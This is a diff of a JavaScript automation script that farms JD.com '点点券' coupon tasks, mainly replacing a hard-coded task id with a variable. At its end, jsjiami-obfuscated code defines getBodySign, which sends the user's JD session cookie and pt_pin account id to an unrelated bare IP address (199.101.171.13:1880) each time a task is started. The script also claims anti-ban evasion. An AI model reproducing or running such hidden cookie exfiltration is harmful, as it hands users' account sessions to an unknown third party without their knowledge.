@@ -7,7 +7,7 @@
 2、脚本中增加了防火爆和防封号脚本。
 */
 
-const $ = new Env("点点券2022")
+const $ = new Env("点点券")
 const Ver = '20220427';
 const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
 let cookiesArr = [], cookie = '';
@@ -76,14 +76,14 @@ async function ldrw(){
                     if(vo.displayOrder===3){
                         //获取签名并领取任务taskStage=0 任务未领 taskStage=1 任务已领  taskStage=2 已经完成
                         if(vo.taskStage ===0){
-                            await getBodySign('startTask','445',$.UserName1);
+                            await getBodySign('startTask',vo.id,$.UserName1);
                             //console.log(helpno);
                             data1=await startTask("necklace_startTask",UUID)
                             console.log("📮"+vo.taskName+"->"+data1.data?.biz_msg+"✔✔✔")
                             //console.log(JSON.stringify(data1));
                         }
                         if(vo.taskStage ===1){
-                            data = await GetAllTask("necklace_getTask",UUID,"","body=%7B%22taskId%22%3A445%7D");
+                            data = await GetAllTask("necklace_getTask",UUID,"","body=%7B%22taskId%22%3A"+vo.id+"%7D");
                             //console.log("11111111111111111"+JSON.stringify(data))
                             for (let vo1 of data.data?.result?.taskItems){
                                 //console.log(vo1.id+'->'+vo1.title+'->'+vo1.status);
@@ -91,9 +91,9 @@ async function ldrw(){
                                     console.log("🥇"+vo.taskName+"-"+vo1.title+"->任务已经完成啦✔✔✔")
                                 }
                                 if(vo1.status===0){
-                                    data2 = await GetAllTask("necklace_timedTask",UUID,"","body=%7B%22taskId%22%3A445%2C%22itemId%22%3A%22"+vo1.id+"%22%7D");
+                                    data2 = await GetAllTask("necklace_timedTask",UUID,"","body=%7B%22taskId%22%3A"+vo.id+"%2C%22itemId%22%3A%22"+vo1.id+"%22%7D");
                                     await $.wait(5000);
-                                    data2 = await GetAllTask("necklace_reportTask",UUID,"","body=%7B%22taskId%22%3A445%2C%22itemId%22%3A%22"+vo1.id+"%22%7D");
+                                    data2 = await GetAllTask("necklace_reportTask",UUID,"","body=%7B%22taskId%22%3A"+vo.id+"%2C%22itemId%22%3A%22"+vo1.id+"%22%7D");
                                     
                                     if(data2!=''){
                                         console.log("🔊🔊🔊"+vo.taskName+'->'+vo1.title+"->"+data2.data.biz_msg )
@@ -111,7 +111,7 @@ async function ldrw(){
                         data2 = await GetAllTask("necklace_newHomePage",UUID,"&client=ios&clientVersion=10.4.6&build=168014&partner=&rfs=0000","body=%7B%7D");
                         //console.log("11111111111111111"+JSON.stringify(data2))
                         for (let vo3 of data2.data?.result?.bubbles){
-                            if(vo3.taskConfigId===445){
+                            if(vo3.taskConfigId===vo.id){
                                 await getBodySign('necklace_chargeScores',vo3.id,$.UserName1);
                                 data4=await startTask("necklace_chargeScores",UUID)
                                 console.log("🧧"+vo.taskName+"->红包开出"+data4.data?.result?.giftScoreNum+"积分.")
@@ -496,6 +496,7 @@ function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).index
 var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdd5e5=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x64\x64\x71\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x54\x79\x70\x65\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x64\x61\x74\x61\x31","\x64\x61\x74\x61\x32","\x64\x61\x74\x61\x33","\x64\x61\x74\x61\x34","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0x48abx2,_0x48abx3,_0x48abx4){return  new Promise((_0x48abx5)=>{$[__Oxdd5e5[0xc]]({url:`${__Oxdd5e5[0x0]}${_0x48abx2}${__Oxdd5e5[0x1]}${_0x48abx3}${__Oxdd5e5[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x48abx4,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x48abx6,_0x48abx7,_0x48abx8)=>{try{_0x48abx8= JSON[__Oxdd5e5[0x3]](_0x48abx8);data1= _0x48abx8[__Oxdd5e5[0x4]];helpno= _0x48abx8[__Oxdd5e5[0x5]]+ _0x48abx8[__Oxdd5e5[0x6]]+ _0x48abx8[__Oxdd5e5[0x7]]+ _0x48abx8[__Oxdd5e5[0x8]]+ _0x48abx8[__Oxdd5e5[0x9]]}catch(e){$[__Oxdd5e5[0xb]](__Oxdd5e5[0xa],e)}finally{_0x48abx5(data1)}})})}(function(_0x48abx9,_0x48abxa,_0x48abxb,_0x48abxc,_0x48abxd,_0x48abxe){_0x48abxe= __Oxdd5e5[0xd];_0x48abxc= function(_0x48abxf){if( typeof alert!== _0x48abxe){alert(_0x48abxf)};if( typeof console!== _0x48abxe){console[__Oxdd5e5[0xe]](_0x48abxf)}};_0x48abxb= function(_0x48abx10,_0x48abx9){return _0x48abx10+ _0x48abx9};_0x48abxd= _0x48abxb(__Oxdd5e5[0xf],_0x48abxb(_0x48abxb(__Oxdd5e5[0x10],__Oxdd5e5[0x11]),__Oxdd5e5[0x12]));try{_0x48abx9= __encode;if(!( typeof _0x48abx9!== _0x48abxe&& _0x48abx9=== _0x48abxb(__Oxdd5e5[0x13],__Oxdd5e5[0x14]))){_0x48abxc(_0x48abxd)}}catch(e){_0x48abxc(_0x48abxd)}})({})
 
 var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdd5e7=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x3F\x61\x70\x70\x69\x64\x3D\x63\x6F\x75\x70\x6F\x6E\x2D\x6E\x65\x63\x6B\x6C\x61\x63\x65\x26\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x6C\x6F\x67\x69\x6E\x54\x79\x70\x65\x3D\x32\x26\x74\x3D","\x6E\x6F\x77","\x26\x75\x75\x69\x64\x3D","","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x35\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E\x2C\x20\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E\x2C\x20\x2A\x2F\x2A","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x69\x73\x4E\x6F\x64\x65","\x4A\x44\x5F\x55\x53\x45\x52\x5F\x41\x47\x45\x4E\x54","\x65\x6E\x76","\x55\x53\x45\x52\x5F\x41\x47\x45\x4E\x54","\x2E\x2F\x55\x53\x45\x52\x5F\x41\x47\x45\x4E\x54\x53","\x4A\x44\x55\x41","\x67\x65\x74\x64\x61\x74\x61","\x6A\x64\x61\x70\x70\x3B\x69\x50\x68\x6F\x6E\x65\x3B\x39\x2E\x34\x2E\x34\x3B\x31\x34\x2E\x33\x3B\x6E\x65\x74\x77\x6F\x72\x6B\x2F\x34\x67\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20\x31\x34\x5F\x33\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x4D\x6F\x62\x69\x6C\x65\x2F\x31\x35\x45\x31\x34\x38\x3B\x73\x75\x70\x70\x6F\x72\x74\x4A\x44\x53\x48\x57\x4B\x2F\x31","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6C\x6F\x67","\x6E\x61\x6D\x65","\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5","\x70\x61\x72\x73\x65","\u670D\u52A1\u5668\u8FD4\u56DE\u7A7A\u6570\u636E","\x6C\x6F\x67\x45\x72\x72","\x70\x6F\x73\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function startTask(_0x72cbx2,_0x72cbx3){return  new Promise(async (_0x72cbx4)=>{const _0x72cbx5={url:`${__Oxdd5e7[0x0]}${_0x72cbx2}${__Oxdd5e7[0x1]}${Date[__Oxdd5e7[0x2]]()}${__Oxdd5e7[0x3]}${_0x72cbx3}${__Oxdd5e7[0x4]}`,body:helpno,headers:{"\x61\x75\x74\x68\x6F\x72\x69\x74\x79":__Oxdd5e7[0x5],"\x6F\x72\x69\x67\x69\x6E":__Oxdd5e7[0x6],"\x61\x63\x63\x65\x70\x74":__Oxdd5e7[0x7],"\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65":__Oxdd5e7[0x8],"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":$[__Oxdd5e7[0x9]]()?(process[__Oxdd5e7[0xb]][__Oxdd5e7[0xa]]?process[__Oxdd5e7[0xb]][__Oxdd5e7[0xa]]:(require(__Oxdd5e7[0xd])[__Oxdd5e7[0xc]])):($[__Oxdd5e7[0xf]](__Oxdd5e7[0xe])?$[__Oxdd5e7[0xf]](__Oxdd5e7[0xe]):__Oxdd5e7[0x10])}};$[__Oxdd5e7[0x18]](_0x72cbx5,(_0x72cbx6,_0x72cbx7,_0x72cbx8)=>{try{if(_0x72cbx6){console[__Oxdd5e7[0x12]](`${__Oxdd5e7[0x4]}${JSON[__Oxdd5e7[0x11]](_0x72cbx6)}${__Oxdd5e7[0x4]}`);console[__Oxdd5e7[0x12]](`${__Oxdd5e7[0x4]}${$[__Oxdd5e7[0x13]]}${__Oxdd5e7[0x14]}`)}else {if(_0x72cbx8){_0x72cbx8= JSON[__Oxdd5e7[0x15]](_0x72cbx8)}else {console[__Oxdd5e7[0x12]](`${__Oxdd5e7[0x16]}`)}}}catch(e){$[__Oxdd5e7[0x17]](e)}finally{_0x72cbx4(_0x72cbx8)}})})}(function(_0x72cbx9,_0x72cbxa,_0x72cbxb,_0x72cbxc,_0x72cbxd,_0x72cbxe){_0x72cbxe= __Oxdd5e7[0x19];_0x72cbxc= function(_0x72cbxf){if( typeof alert!== _0x72cbxe){alert(_0x72cbxf)};if( typeof console!== _0x72cbxe){console[__Oxdd5e7[0x12]](_0x72cbxf)}};_0x72cbxb= function(_0x72cbx10,_0x72cbx9){return _0x72cbx10+ _0x72cbx9};_0x72cbxd= _0x72cbxb(__Oxdd5e7[0x1a],_0x72cbxb(_0x72cbxb(__Oxdd5e7[0x1b],__Oxdd5e7[0x1c]),__Oxdd5e7[0x1d]));try{_0x72cbx9= __encode;if(!( typeof _0x72cbx9!== _0x72cbxe&& _0x72cbx9=== _0x72cbxb(__Oxdd5e7[0x1e],__Oxdd5e7[0x1f]))){_0x72cbxc(_0x72cbxd)}}catch(e){_0x72cbxc(_0x72cbxd)}})({})
+
 
 
 
